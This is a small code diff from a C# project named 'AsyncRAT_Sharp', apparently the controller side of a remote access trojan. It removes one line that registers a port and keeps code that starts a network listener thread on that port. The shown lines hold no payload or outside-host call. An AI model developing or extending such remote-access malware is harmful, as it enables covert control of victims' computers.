@@ -80,7 +80,6 @@ namespace AsyncRAT_Sharp
             {
                 if (!string.IsNullOrWhiteSpace(PORT))
                 {
-                    Settings.Ports.Add(Convert.ToInt32(PORT.ToString().Trim()));
                     listener = new Listener();
                     Thread thread = new Thread(new ParameterizedThreadStart(listener.Connect));
                     thread.Start(Convert.ToInt32(PORT.ToString().Trim()));
